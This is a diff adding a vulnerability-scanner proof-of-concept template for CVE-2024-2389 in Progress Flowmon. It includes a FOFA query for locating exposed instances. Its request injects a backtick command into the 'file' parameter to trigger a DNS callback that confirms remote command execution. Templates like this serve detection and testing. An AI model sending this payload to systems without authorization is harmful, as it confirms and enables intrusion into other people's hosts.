@@ -1,0 +1,19 @@
+id: poc-yaml-progress-flowmon-command-execution
+info:
+  name: Progress Flowmon 命令执行漏洞 (CVE-2024-2389)
+  severity: critical
+  tags:
+  - DNSLOG
+  - 两高一弱
+  - rce
+  - CVE-2024-2389
+  finger: progress_flowmon
+  fofa: body="Flowmon-Web-Interface"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /service.pdfs/confluence?lang=en&file=`ping+{{.domain}}`
+  expression: reverse.Verify()
+transport: http
